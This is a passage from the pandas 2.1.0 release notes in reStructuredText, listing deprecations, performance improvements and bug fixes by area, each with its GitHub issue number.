:class:`Categorical` constructor, use :meth:`Categorical.from_codes` instead (:issue:`20110`)\n- Deprecated the behavior of :func:`is_bool_dtype` returning ``True`` for object-dtype :class:`Index` of bool objects (:issue:`52680`)\n- Deprecated the methods :meth:`Series.bool` and :meth:`DataFrame.bool` (:issue:`51749`)\n- Deprecated unused ``closed`` and ``normalize`` keywords in the :class:`DatetimeIndex` constructor (:issue:`52628`)\n- Deprecated unused ``closed`` keyword in the :class:`TimedeltaIndex` constructor (:issue:`52628`)\n- Deprecated logical operation between two non boolean :class:`Series` with different indexes always coercing the result to bool dtype. In a future version, this will maintain the return type of the inputs (:issue:`52500`, :issue:`52538`)\n- Deprecated :class:`Period` and :class:`PeriodDtype` with ``BDay`` freq, use a :class:`DatetimeIndex` with ``BDay`` freq instead (:issue:`53446`)\n- Deprecated :func:`value_counts`, use ``pd.Series(obj).value_counts()`` instead (:issue:`47862`)\n- Deprecated :meth:`Series.first` and :meth:`DataFrame.first`; create a mask and filter using ``.loc`` instead (:issue:`45908`)\n- Deprecated :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` for object-dtype (:issue:`53631`)\n- Deprecated :meth:`Series.last` and :meth:`DataFrame.last`; create a mask and filter using ``.loc`` instead (:issue:`53692`)\n- Deprecated allowing arbitrary ``fill_value`` in :class:`SparseDtype`, in a future version the ``fill_value`` will need to be compatible with the ``dtype.subtype``, either a scalar that can be held by that subtype or ``NaN`` for integer or bool subtypes (:issue:`23124`)\n- Deprecated allowing bool dtype in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile`, consistent with the :meth:`Series.quantile` and :meth:`DataFrame.quantile` behavior (:issue:`51424`)\n- Deprecated behavior of :func:`.testing.assert_series_equal` and :func:`.testing.assert_frame_equal` considering NA-like values (e.g. ``NaN`` vs ``None`` as equivalent) (:issue:`52081`)\n- Deprecated bytes input to :func:`read_excel`. To read a file path, use a string or path-like object (:issue:`53767`)\n- Deprecated constructing :class:`.SparseArray` from scalar data, pass a sequence instead (:issue:`53039`)\n- Deprecated falling back to filling when ``value`` is not specified in :meth:`DataFrame.replace` and :meth:`Series.replace` with non-dict-like ``to_replace`` (:issue:`33302`)\n- Deprecated literal json input to :func:`read_json`. Wrap literal json string input in ``io.StringIO`` instead (:issue:`53409`)\n- Deprecated literal string input to :func:`read_xml`. Wrap literal string/bytes input in ``io.StringIO`` / ``io.BytesIO`` instead (:issue:`53767`)\n- Deprecated literal string/bytes input to :func:`read_html`. Wrap literal string/bytes input in ``io.StringIO`` / ``io.BytesIO`` instead (:issue:`53767`)\n- Deprecated option ``mode.use_inf_as_na``, convert inf entries to ``NaN`` before instead (:issue:`51684`)\n- Deprecated parameter ``obj`` in :meth:`.DataFrameGroupBy.get_group` (:issue:`53545`)\n- Deprecated positional indexing on :class:`Series` with :meth:`Series.__getitem__` and :meth:`Series.__setitem__`, in a future version ``ser[item]`` will *always* interpret ``item`` as a label, not a position (:issue:`50617`)\n- Deprecated replacing builtin and NumPy functions in ``.agg``, ``.apply``, and ``.transform``; use the corresponding string alias (e.g. ``\"sum\"`` for ``sum`` or ``np.sum``) instead (:issue:`53425`)\n- Deprecated strings ``T``, ``t``, ``L`` and ``l`` denoting units in :func:`to_timedelta` (:issue:`52536`)\n- Deprecated the \"method\" and \"limit\" keywords in ``.ExtensionArray.fillna``, implement ``_pad_or_backfill`` instead (:issue:`53621`)\n- Deprecated the ``method`` and ``limit`` keywords in :meth:`DataFrame.replace` and :meth:`Series.replace` (:issue:`33302`)\n- Deprecated the ``method`` and ``limit`` keywords on :meth:`Series.fillna`, :meth:`DataFrame.fillna`, :meth:`.SeriesGroupBy.fillna`, :meth:`.DataFrameGroupBy.fillna`, and :meth:`.Resampler.fillna`, use ``obj.bfill()`` or ``obj.ffill()`` instead (:issue:`53394`)\n- Deprecated the behavior of :meth:`Series.__getitem__`, :meth:`Series.__setitem__`, :meth:`DataFrame.__getitem__`, :meth:`DataFrame.__setitem__` with an integer slice on objects with a floating-dtype index, in a future version this will be treated as *positional* indexing (:issue:`49612`)\n- Deprecated the use of non-supported datetime64 and timedelta64 resolutions with :func:`pandas.array`. Supported resolutions are: \"s\", \"ms\", \"us\", \"ns\" resolutions (:issue:`53058`)\n- Deprecated values ``\"pad\"``, ``\"ffill\"``, ``\"bfill\"``, ``\"backfill\"`` for :meth:`Series.interpolate` and :meth:`DataFrame.interpolate`, use ``obj.ffill()`` or ``obj.bfill()`` instead (:issue:`53581`)\n- Deprecated the behavior of :meth:`Index.argmax`, :meth:`Index.argmin`, :meth:`Series.argmax`, :meth:`Series.argmin` with either all-NAs and ``skipna=True`` or any-NAs and ``skipna=False`` returning -1; in a future version this will raise ``ValueError`` (:issue:`33941`, :issue:`33942`)\n- Deprecated allowing non-keyword arguments in :meth:`DataFrame.to_sql` except ``name`` and ``con`` (:issue:`54229`)\n- Deprecated silently ignoring ``fill_value`` when passing both ``freq`` and ``fill_value`` to :meth:`DataFrame.shift`, :meth:`Series.shift` and :meth:`.DataFrameGroupBy.shift`; in a future version this will raise ``ValueError`` (:issue:`53832`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_210.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :func:`concat` with homogeneous ``np.float64`` or ``np.float32`` dtypes (:issue:`52685`)\n- Performance improvement in :func:`factorize` for object columns not containing strings (:issue:`51921`)\n- Performance improvement in :func:`read_orc` when reading a remote URI file path (:issue:`51609`)\n- Performance improvement in :func:`read_parquet` and :meth:`DataFrame.to_parquet` when reading a remote file with ``engine=\"pyarrow\"`` (:issue:`51609`)\n- Performance improvement in :func:`read_parquet` on string columns when using ``use_nullable_dtypes=True`` (:issue:`47345`)\n- Performance improvement in :meth:`DataFrame.clip` and :meth:`Series.clip` (:issue:`51472`)\n- Performance improvement in :meth:`DataFrame.filter` when ``items`` is given (:issue:`52941`)\n- Performance improvement in :meth:`DataFrame.first_valid_index` and :meth:`DataFrame.last_valid_index` for extension array dtypes (:issue:`51549`)\n- Performance improvement in :meth:`DataFrame.where` when ``cond`` is backed by an extension dtype (:issue:`51574`)\n- Performance improvement in :meth:`MultiIndex.set_levels` and :meth:`MultiIndex.set_codes` when ``verify_integrity=True`` (:issue:`51873`)\n- Performance improvement in :meth:`MultiIndex.sortlevel` when ``ascending`` is a list (:issue:`51612`)\n- Performance improvement in :meth:`Series.combine_first` (:issue:`51777`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.fillna` when array does not contain nulls (:issue:`51635`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.isna` when array has zero nulls or is all nulls (:issue:`51630`)\n- Performance improvement when parsing strings to ``boolean[pyarrow]`` dtype (:issue:`51730`)\n- Performance improvement when searching an :class:`Index` sliced from other indexes (:issue:`51738`)\n- Performance improvement in :func:`concat` (:issue:`52291`, :issue:`52290`)\n- :class:`Period`'s default formatter (``period_format``) is now significantly (~twice) faster. This improves performance of ``str(Period)``, ``repr(Period)``, and :meth:`.Period.strftime(fmt=None)`, as well as ``.PeriodArray.strftime(fmt=None)``, ``.PeriodIndex.strftime(fmt=None)`` and ``.PeriodIndex.format(fmt=None)``. ``to_csv`` operations involving :class:`.PeriodArray` or :class:`PeriodIndex` with default ``date_format`` are also significantly accelerated (:issue:`51459`)\n- Performance improvement accessing :attr:`arrays.IntegerArrays.dtype` & :attr:`arrays.FloatingArray.dtype` (:issue:`52998`)\n- Performance improvement for :class:`.DataFrameGroupBy`/:class:`.SeriesGroupBy` aggregations (e.g. :meth:`.DataFrameGroupBy.sum`) with ``engine=\"numba\"`` (:issue:`53731`)\n- Performance improvement in :class:`DataFrame` reductions with ``axis=1`` and extension dtypes (:issue:`54341`)\n- Performance improvement in :class:`DataFrame` reductions with ``axis=None`` and extension dtypes (:issue:`54308`)\n- Performance improvement in :class:`MultiIndex` and multi-column operations (e.g. :meth:`DataFrame.sort_values`, :meth:`DataFrame.groupby`, :meth:`Series.unstack`) when index/column values are already sorted (:issue:`53806`)\n- Performance improvement in :class:`Series` reductions (:issue:`52341`)\n- Performance improvement in :func:`concat` when ``axis=1`` and objects have different indexes (:issue:`52541`)\n- Performance improvement in :func:`concat` when the concatenation axis is a :class:`MultiIndex` (:issue:`53574`)\n- Performance improvement in :func:`merge` for PyArrow backed strings (:issue:`54443`)\n- Performance improvement in :func:`read_csv` with ``engine=\"c\"`` (:issue:`52632`)\n- Performance improvement in :meth:`.ArrowExtensionArray.to_numpy` (:issue:`52525`)\n- Performance improvement in :meth:`.DataFrameGroupBy.groups` (:issue:`53088`)\n- Performance improvement in :meth:`DataFrame.astype` when ``dtype`` is an extension dtype (:issue:`54299`)\n- Performance improvement in :meth:`DataFrame.iloc` when input is an single integer and dataframe is backed by extension dtypes (:issue:`54508`)\n- Performance improvement in :meth:`DataFrame.isin` for extension dtypes (:issue:`53514`)\n- Performance improvement in :meth:`DataFrame.loc` when selecting rows and columns (:issue:`53014`)\n- Performance improvement in :meth:`DataFrame.transpose` when transposing a DataFrame with a single PyArrow dtype (:issue:`54224`)\n- Performance improvement in :meth:`DataFrame.transpose` when transposing a DataFrame with a single masked dtype, e.g. :class:`Int64` (:issue:`52836`)\n- Performance improvement in :meth:`Series.add` for PyArrow string and binary dtypes (:issue:`53150`)\n- Performance improvement in :meth:`Series.corr` and :meth:`Series.cov` for extension dtypes (:issue:`52502`)\n- Performance improvement in :meth:`Series.drop_duplicates` for ``ArrowDtype`` (:issue:`54667`).\n- Performance improvement in :meth:`Series.ffill`, :meth:`Series.bfill`, :meth:`DataFrame.ffill`, :meth:`DataFrame.bfill` with PyArrow dtypes (:issue:`53950`)\n- Performance improvement in :meth:`Series.str.get_dummies` for PyArrow-backed strings (:issue:`53655`)\n- Performance improvement in :meth:`Series.str.get` for PyArrow-backed strings (:issue:`53152`)\n- Performance improvement in :meth:`Series.str.split` with ``expand=True`` for PyArrow-backed strings (:issue:`53585`)\n- Performance improvement in :meth:`Series.to_numpy` when dtype is a NumPy float dtype and ``na_value`` is ``np.nan`` (:issue:`52430`)\n- Performance improvement in :meth:`~arrays.ArrowExtensionArray.astype` when converting from a PyArrow timestamp or duration dtype to NumPy (:issue:`53326`)\n- Performance improvement in various :class:`MultiIndex` set and indexing operations (:issue:`53955`)\n- Performance improvement when doing various reshaping operations on :class:`arrays.IntegerArray` & :class:`arrays.FloatingArray` by avoiding doing unnecessary validation (:issue:`53013`)\n- Performance improvement when indexing with PyArrow timestamp and duration dtypes (:issue:`53368`)\n- Performance improvement when passing an array to :meth:`RangeIndex.take`, :meth:`DataFrame.loc`, or :meth:`DataFrame.iloc` and the DataFrame is using a RangeIndex (:issue:`53387`)\n\n.. ---------------------------------------------------------------------------\n.. _whatsnew_210.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- Bug in :meth:`CategoricalIndex.remove_categories` where ordered categories would not be maintained (:issue:`53935`).\n- Bug in :meth:`Series.astype` with ``dtype=\"category\"`` for nullable arrays with read-only null value masks (:issue:`53658`)\n- Bug in :meth:`Series.map` , where the value of the ``na_action`` parameter was not used if the series held a :class:`Categorical` (:issue:`22527`).\n\nDatetimelike\n^^^^^^^^^^^^\n- :meth:`DatetimeIndex.map` with ``na_action=\"ignore\"`` now works as expected (:issue:`51644`)\n- :meth:`DatetimeIndex.slice_indexer` now raises ``KeyError`` for non-monotonic indexes if either of the slice bounds is not in the index; this behaviour was previously deprecated but inconsistently handled (:issue:`53983`)\n- Bug in :class:`DateOffset` which had inconsistent behavior when multiplying a :class:`DateOffset` object by a constant (:issue:`47953`)\n- Bug in :func:`date_range` when ``freq`` was a :class:`DateOffset` with ``nanoseconds`` (:issue:`46877`)\n- Bug in :func:`to_datetime` converting :class:`Series` or :class:`DataFrame` containing :class:`arrays.ArrowExtensionArray` of PyArrow timestamps to numpy datetimes (:issue:`52545`)\n- Bug in :meth:`.DatetimeArray.map` and :meth:`DatetimeIndex.map`, where the supplied callable operated array-wise instead of element-wise (:issue:`51977`)\n- Bug in :meth:`DataFrame.to_sql` raising ``ValueError`` for PyArrow-backed date like dtypes (:issue:`53854`)\n- Bug in :meth:`Timestamp.date`, :meth:`Timestamp.isocalendar`, :meth:`Timestamp.timetuple`, and :meth:`Timestamp.toordinal` were returning incorrect results for inputs outside those supported by the Python standard library's datetime module (:issue:`53668`)\n- Bug in :meth:`Timestamp.round` with values close to the implementation bounds returning incorrect results instead of raising ``OutOfBoundsDatetime`` (:issue:`51494`)\n- Bug in constructing a :class:`Series` or :class:`DataFrame` from a datetime or timedelta scalar always inferring nanosecond resolution instead of inferring from the input (:issue:`52212`)\n- Bug in constructing a :class:`Timestamp` from a string representing a time without a date inferring an incorrect unit (:issue:`54097`)\n- Bug in constructing a :class:`Timestamp` with ``ts_input=pd.NA`` raising ``TypeError`` (:issue:`45481`)\n- Bug in parsing datetime strings with weekday but no day e.g. \"2023 Sept Thu\" incorrectly raising ``AttributeError`` instead of ``ValueError`` (:issue:`52659`)\n- Bug in the repr for :class:`Series` when dtype is a timezone aware datetime with non-nanosecond resolution raising ``OutOfBoundsDatetime`` (:issue:`54623`)\n\nTimedelta\n^^^^^^^^^\n- Bug in :class:`TimedeltaIndex` division or multiplication leading to ``.freq`` of \"0 Days\" instead of ``None`` (:issue:`51575`)\n- Bug in :class:`Timedelta` with NumPy ``timedelta64`` objects not properly raising ``ValueError`` (:issue:`52806`)\n- Bug in :func:`to_timedelta` converting :class:`Series` or :class:`DataFrame` containing :class:`ArrowDtype` of ``pyarrow.duration`` to NumPy ``timedelta64`` (:issue:`54298`)\n- Bug in :meth:`Timedelta.__hash__`, raising an ``OutOfBoundsTimedelta`` on certain large values of second resolution (:issue:`54037`)\n- Bug in :meth:`Timedelta.round` with values close to the implementation bounds returning incorrect results instead of raising ``OutOfBoundsTimedelta`` (:issue:`51494`)\n- Bug in :meth:`TimedeltaIndex.map` with ``na_action=\"ignore\"`` (:issue:`51644`)\n- Bug in :meth:`arrays.TimedeltaArray.map` and :meth:`TimedeltaIndex.map`, where the supplied callable operated array-wise instead of element-wise (:issue:`51977`)\n\nTimezones\n^^^^^^^^^\n- Bug in :func:`infer_freq` that raises ``TypeError`` for ``Series`` of timezone-aware timestamps (:issue:`52456`)\n- Bug in :meth:`DatetimeTZDtype.base` that always returns a NumPy dtype with nanosecond resolution (:issue:`52705`)\n\nNumeric\n^^^^^^^\n- Bug in :class:`RangeIndex` setting ``step`` incorrectly when being the subtrahend with minuend a numeric value (:issue:`53255`)\n- Bug in :meth:`Series.corr` and :meth:`Series.cov` raising ``AttributeError`` for masked dtypes (:issue:`51422`)\n- Bug when calling :meth:`Series.kurt` and :meth:`Series.skew` on NumPy data of all zero returning a Python type instead of a NumPy type (:issue:`53482`)\n- Bug in :meth:`Series.mean`, :meth:`DataFrame.mean` with object-dtype values containing strings that can be converted to numbers (e.g. \"2\") returning incorrect numeric results; these now raise ``TypeError`` (:issue:`36703`, :issue:`44008`)\n- Bug in :meth:`DataFrame.corrwith` raising ``NotImplementedError`` for PyArrow-backed dtypes (:issue:`52314`)\n- Bug in :meth:`DataFrame.size` and :meth:`Series.size` returning 64-bit integer instead of a Python int (:issue:`52897`)\n- Bug in :meth:`DateFrame.dot` returning ``object`` dtype for :class:`ArrowDtype` data (:issue:`53979`)\n- Bug in :meth:`Series.any`, :meth:`Series.all`, :meth:`DataFrame.any`, and :meth:`DataFrame.all` had the default value of ``bool_only`` set to ``None`` instead of ``False``; this change should have no impact on users (:issue:`53258`)\n- Bug in :meth:`Series.corr` and :meth:`Series.cov` raising ``AttributeError`` for masked dtypes (:issue:`51422`)\n- Bug in :meth:`Series.median` and :meth:`DataFrame.median` with object-dtype values containing strings that can be converted to numbers (e.g. \"2\") returning incorrect numeric results; these now raise ``TypeError`` (:issue:`34671`)\n- Bug in :meth:`Series.sum` converting dtype ``uint64`` to ``int64`` (:issue:`53401`)\n\n\nConversion\n^^^^^^^^^^\n- Bug in :func:`DataFrame.style.to_latex` and :func:`DataFrame.style.to_html` if the DataFrame contains integers with more digits than can be represented by floating point double precision (:issue:`52272`)\n- Bug in :func:`array`  when given a ``datetime64`` or ``timedelta64`` dtype with unit of \"s\", \"us\", or \"ms\" returning :class:`.NumpyExtensionArray` instead of :class:`.DatetimeArray` or :class:`.TimedeltaArray` (:issue:`52859`)\n- Bug in :func:`array`  when given an empty list and no dtype returning :class:`.NumpyExtensionArray` instead of :class:`.FloatingArray` (:issue:`54371`)\n- Bug in :meth:`.ArrowDtype.numpy_dtype` returning nanosecond units for non-nanosecond ``pyarrow.timestamp`` and ``pyarrow.duration`` types (:issue:`51800`)\n- Bug in :meth:`DataFrame.__repr__` incorrectly raising a ``TypeError`` when the dtype of a column is ``np.record`` (:issue:`48526`)\n- Bug in :meth:`DataFrame.info` raising  ``ValueError`` when ``use_numba`` is set (:issue:`51922`)\n- Bug in :meth:`DataFrame.insert` raising ``TypeError`` if ``loc`` is ``np.int64`` (:issue:`53193`)\n- Bug in :meth:`HDFStore.select` loses precision of large int when stored and retrieved (:issue:`54186`)\n- Bug in :meth:`Series.astype` not supporting ``object_`` (:issue:`54251`)\n\nStrings\n^^^^^^^\n- Bug in :meth:`Series.str` that did not raise a  ``TypeError`` when iterated (:issue:`54173`)\n- Bug in ``repr`` for :class:`DataFrame`` with string-dtype columns (:issue:`54797`)\n\nInterval\n^^^^^^^^\n- :meth:`IntervalIndex.get_indexer` and :meth:`IntervalIndex.get_indexer_nonunique` raising if ``target`` is read-only array (:issue:`53703`)\n- Bug in :class:`IntervalDtype` where the object could be kept alive when deleted (:issue:`54184`)\n- Bug in :func:`interval_range` where a float ``step`` would produce incorrect intervals from floating point artifacts (:issue:`54477`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`DataFrame.__setitem__` losing dtype when setting a :class:`DataFrame` into duplicated columns (:issue:`53143`)\n- Bug in :meth:`DataFrame.__setitem__` with a boolean mask and :meth:`DataFrame.putmask` with mixed non-numeric dtypes and a value other than ``NaN`` incorrectly raising ``TypeError`` (:issue:`53291`)\n- Bug in :meth:`DataFrame.iloc` when using ``nan`` as the only element (:issue:`52234`)\n- Bug in :meth:`Series.loc` casting :class:`Series` to ``np.dnarray`` when assigning :class:`Series` at predefined index of ``object`` dtype :class:`Series` (:issue:`48933`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`DataFrame.interpolate` failing to fill across data when ``method`` is ``\"pad\"``, ``\"ffill\"``, ``\"bfill\"``, or ``\"backfill\"`` (:issue:`53898`)\n- Bug in :meth:`DataFrame.interpolate` ignoring ``inplace`` when :class:`DataFrame` is empty (:issue:`53199`)\n- Bug in :meth:`Series.idxmin`, :meth:`Series.idxmax`, :meth:`DataFrame.idxmin`, :meth:`DataFrame.idxmax` with a :class:`DatetimeIndex` index containing ``NaT`` incorrectly returning ``NaN`` instead of ``NaT`` (:issue:`43587`)\n- Bug in :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` failing to raise on invalid ``downcast`` keyword, which can be only ``None`` or ``\"infer\"`` (:issue:`53103`)\n- Bug in :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` with complex dtype incorrectly failing to fill ``NaN`` entries (:issue:`53635`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`MultiIndex.set_levels` not preserving dtypes for :class:`Categorical` (:issue:`52125`)\n- Bug in displaying a :class:`MultiIndex` with a long element (:issue:`52960`)\n\nI/O\n^^^\n- :meth:`DataFrame.to_orc` now raising ``ValueError`` when non-default :class:`Index` is given (:issue:`51828`)\n- :meth:`DataFrame.to_sql` now raising ``ValueError`` when the name param is left empty while using SQLAlchemy to connect (:issue:`52675`)\n- Bug in :func:`json_normalize` could not parse metadata fields list type (:issue:`37782`)\n- Bug in :func:`read_csv` where it would error when ``parse_dates`` was set to a list or dictionary with ``engine=\"pyarrow\"`` (:issue:`47961`)\n- Bug in :func:`read_csv` with ``engine=\"pyarrow\"`` raising when specifying a ``dtype`` with ``index_col`` (:issue:`53229`)\n- Bug in :func:`read_hdf` not properly closing store after an ``IndexError`` is raised (:issue:`52781`)\n- Bug in :func:`read_html` where style elements were read into DataFrames (:issue:`52197`)\n- Bug in :func:`read_html` where tail texts were removed together with elements containing ``display:none`` style (:issue:`51629`)\n- Bug in :func:`read_sql_table` raising an exception when reading a view (:issue:`52969`)\n- Bug in :func:`read_sql` when reading multiple timezone aware columns with the same column name (:issue:`44421`)\n- Bug in :func:`read_xml` stripping whitespace in string data (:issue:`53811`)\n- Bug in :meth:`DataFrame.to_html` where ``colspace`` was incorrectly applied in case of multi index columns (:issue:`53885`)\n- Bug in :meth:`DataFrame.to_html` where conversion for an empty :class:`DataFrame` with complex dtype raised a ``ValueError`` (:issue:`54167`)\n- Bug in :meth:`DataFrame.to_json` where :class:`.DateTimeArray`/:class:`.DateTimeIndex` with non nanosecond precision could not be serialized correctly (:issue:`53686`)\n- Bug when writing and reading empty Stata dta files where dtype information was lost (:issue:`46240`)\n- Bug where ``bz2`` was treated as a hard requirement (:issue:`53857`)\n\nPeriod\n^^^^^^\n- Bug in :class:`PeriodDtype` constructor failing to raise ``TypeError`` when no argument is passed or when ``None`` is passed (:issue:`27388`)\n- Bug in :class:`PeriodDtype` constructor incorrectly returning the same ``normalize`` for different :class:`DateOffset` ``freq`` inputs (:issue:`24121`)\n- Bug in :class:`PeriodDtype` constructor raising ``ValueError`` instead of ``TypeError`` when an invalid type is passed (:issue:`51790`)\n- Bug in :class:`PeriodDtype` where the object could be kept alive when deleted (:issue:`54184`)\n- Bug in :func:`read_csv` not processing empty strings as a null value, with ``engine=\"pyarrow\"`` (:issue:`52087`)\n- Bug in :func:`read_csv` returning ``object`` dtype columns instead of ``float64`` dtype columns with ``engine=\"pyarrow\"`` for columns that are all null with ``engine=\"pyarrow\"`` (:issue:`52087`)\n- Bug in :meth:`Period.now` not accepting the ``freq`` parameter as a keyword argument (:issue:`53369`)\n- Bug in :meth:`PeriodIndex.map` with ``na_action=\"ignore\"`` (:issue:`51644`)\n- Bug in :meth:`arrays.PeriodArray.map` and :meth:`PeriodIndex.map`, where the supplied callable operated array-wise instead of element-wise (:issue:`51977`)\n- Bug in incorrectly allowing construction of :class:`Period` or :class:`PeriodDtype` with :class:`CustomBusinessDay` freq; use :class:`BusinessDay` instead (:issue:`52534`)\n\nPlotting\n^^^^^^^^\n- Bug in :meth:`Series.plot` when invoked with ``color=None`` (:issue:`51953`)\n- Fixed UserWarning in :meth:`DataFrame.plot.scatter` when invoked with ``c=\"b\"`` (:issue:`53908`)\n\nGroupby/resample/rolling\n^^^^^^^^^^^^^^^^^^^^^^^^\n- Bug in :meth:`.DataFrameGroupBy.idxmin`, :meth:`.SeriesGroupBy.idxmin`, :meth:`.DataFrameGroupBy.idxmax`, :meth:`.SeriesGroupBy.idxmax` returns wrong dtype when used on an empty DataFrameGroupBy or SeriesGroupBy (:issue:`51423`)\n- Bug in :meth:`DataFrame.groupby.rank` on nullable datatypes when passing ``na_option=\"bottom\"`` or ``na_option=\"top\"`` (:issue:`54206`)\n- Bug in :meth:`DataFrame.resample` and :meth:`Series.resample` in incorrectly allowing non-fixed ``freq`` when resampling on a :class:`TimedeltaIndex` (:issue:`51896`)\n- Bug in :meth:`DataFrame.resample` and :meth:`Series.resample` losing time zone when resampling empty data (:issue:`53664`)\n- Bug in :meth:`DataFrame.resample` and :meth:`Series.resample` where ``origin`` has no effect in resample when values are outside of axis  (:issue:`53662`)\n- Bug in weighted rolling aggregations when specifying ``min_periods=0`` (:issue:`51449`)\n- Bug in :meth:`DataFrame.groupby` and :meth:`Series.groupby` where, when the index of the\n  grouped :class:`Series` or :class:`DataFrame` was a :class:`DatetimeIndex`, :class:`TimedeltaIndex`\n  or :class:`PeriodIndex`, and the ``groupby`` method was given a function as its first argument,\n  the function operated on the whole index rather than each element of the index (:issue:`51979`)\n- Bug in :meth:`.DataFrameGroupBy.agg` with lists not respecting ``as_index=False`` (:issue:`52849`)\n- Bug in :meth:`.DataFrameGroupBy.apply` causing an error to be raised when the input :class:`DataFrame` was subset as a :class:`DataFrame` after groupby (``[['a']]`` and not ``['a']``) and the given callable returned :class:`Series` that were not all indexed the same (:issue:`52444`)\n- Bug in :meth:`.DataFrameGroupBy.apply` raising a ``TypeError`` when selecting multiple columns and providing a function that returns ``np.ndarray`` results (:issue:`18930`)\n- Bug in :meth:`.DataFrameGroupBy.groups` and :meth:`.SeriesGroupBy.groups` with a datetime key in conjunction with another key produced an incorrect number of group keys (:issue:`51158`)\n- Bug in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` may implicitly sort the result index with ``sort=False`` (:issue:`53009`)\n- Bug in :meth:`.SeriesGroupBy.size` where the dtype would be ``np.int64`` for data with :class:`ArrowDtype` or masked dtypes (e.g. ``Int64``) (:issue:`53831`)\n- Bug in :meth:`DataFrame.groupby` with column selection on the resulting groupby object not returning names as tuples when grouping by a list consisting of a single element (:issue:`53500`)\n- Bug in :meth:`.DataFrameGroupBy.var` and :meth:`.SeriesGroupBy.var` failing to raise ``TypeError`` when called with datetime64, timedelta64 or :class:`PeriodDtype` values (:issue:`52128`, :issue:`53045`)\n- Bug in :meth:`.DataFrameGroupBy.resample` with ``kind=\"period\"`` raising ``AttributeError`` (:issue:`24103`)\n- Bug in :meth:`.Resampler.ohlc` with empty object returning a :class:`Series` instead of empty :class:`DataFrame` (:issue:`42902`)\n- Bug in :meth:`.SeriesGroupBy.count` and :meth:`.DataFrameGroupBy.count` where the dtype would be ``np.int64`` for data with :class:`ArrowDtype` or masked dtypes (e.g. ``Int64``) (:issue:`53831`)\n- Bug in :meth:`.SeriesGroupBy.nth` and :meth:`.DataFrameGroupBy.nth` after performing column selection when using ``dropna=\"any\"`` or ``dropna=\"all\"`` would not subset columns (:issue:`53518`)\n- Bug in :meth:`.SeriesGroupBy.nth` and :meth:`.DataFrameGroupBy.nth` raised after performing column selection when using ``dropna=\"any\"`` or ``dropna=\"all\"`` resulted in rows being dropped (:issue:`53518`)\n- Bug in :meth:`.SeriesGroupBy.sum` and :meth:`.DataFrameGroupBy.sum` summing ``np.inf + np.inf`` and ``(-np.inf) + (-np.inf)`` to ``np.nan`` instead of ``np.inf`` and ``-np.inf`` respectively (:issue:`53606`)\n- Bug in :meth:`Series.groupby` raising an error when grouped :class:`Series` has a :class:`DatetimeIndex` index and a :class:`Series` with a name that is a month is given to the ``by`` argument (:issue:`48509`)\n\nReshaping\n^^^^^^^^^\n- Bug in :func:`concat` coercing to ``object`` dtype when one column has ``pa.null()`` dtype (:issue:`53702`)\n- Bug in :func:`crosstab` when ``dropna=False`` would not keep ``np.nan`` in the result (:issue:`10772`)\n- Bug in :func:`melt` where the ``variable`` column would lose extension dtypes (:issue:`54297`)\n- Bug in :func:`merge_asof` raising ``KeyError`` for extension dtypes (:issue:`52904`)\n- Bug in :func:`merge_asof` raising ``ValueError`` for data backed by read-only ndarrays (:issue:`53513`)\n- Bug in :func:`merge_asof` with ``left_index=True`` or ``right_index=True`` with mismatched index dtypes giving incorrect results in some cases instead of raising ``MergeError`` (:issue:`53870`)\n- Bug in :func:`merge` when merging on integer ``ExtensionDtype`` and float NumPy dtype raising ``TypeError`` (:issue:`46178`)\n- Bug in :meth:`DataFrame.agg` and :meth:`Series.agg` on non-unique columns would return incorrect type when dist-like argument passed in (:issue:`51099`)\n- Bug in :meth:`DataFrame.combine_first` ignoring other's columns if ``other`` is empty (:issue:`53792`)\n- Bug in :meth:`DataFrame.idxmin` and :meth:`DataFrame.idxmax`, where the axis dtype would be lost for empty frames (:issue:`53265`)\n- Bug in :meth:`DataFrame.merge` not merging correctly when having ``MultiIndex`` with single level (:issue:`52331`)\n- Bug in :meth:`DataFrame.stack` losing extension dtypes when columns is a :class:`MultiIndex` and frame contains mixed dtypes (:issue:`45740`)\n- Bug in :meth:`DataFrame.stack` sorting columns lexicographically (:issue:`53786`)\n- Bug in :meth:`DataFrame.transpose` inferring dtype for object column (:issue:`51546`)\n- Bug in :meth:`Series.combine_first` converting ``int64`` dtype to ``float64`` and losing precision on very large integers (:issue:`51764`)\n- Bug when joining empty :class:`DataFrame` objects, where the joined index would be a :class:`RangeIndex` instead of the joined index type (:issue:`52777`)\n\nSparse\n^^^^^^\n- Bug in :class:`SparseDtype` constructor failing to raise ``TypeError`` when given an incompatible ``dtype`` for its subtype, which must be a NumPy dtype (:issue:`53160`)\n- Bug in :meth:`arrays.SparseArray.map` allowed the fill value to be included in the sparse values (:issue:`52095`)\n\nExtensionArray\n^^^^^^^^^^^^^^\n- Bug in :class:`.ArrowStringArray` constructor raises ``ValueError`` with dictionary types of strings (:issue:`54074`)\n- Bug in :class:`DataFrame` constructor not copying :class:`Series` with extension dtype when given in dict (:issue:`53744`)\n- Bug in :class:`~arrays.ArrowExtensionArray` converting pandas non-nanosecond temporal objects from non-zero values to zero values (:issue:`53171`)\n- Bug in :meth:`Series.quantile` for PyArrow temporal types raising ``ArrowInvalid`` (:issue:`52678`)\n- Bug in :meth:`Series.rank` returning wrong order for small values with ``Float64`` dtype (:issue:`52471`)\n- Bug in :meth:`Series.unique` for boolean ``ArrowDtype`` with ``NA`` values (:issue:`54667`)\n- Bug in :meth:`~arrays.ArrowExtensionArray.__iter__` and :meth:`~arrays.ArrowExtensionArray.__getitem__` returning python datetime and timedelta objects for non-nano dtypes (:issue:`53326`)\n- Bug in :meth:`~arrays.ArrowExtensionArray.factorize` returning incorrect uniques for a ``pyarrow.dictionary`` type ``pyarrow.chunked_array`` with more than one chunk (:issue:`54844`)\n- Bug when passing an :class:`ExtensionArray` subclass to ``dtype`` keywords. This will now raise a ``UserWarning`` to encourage passing an instance 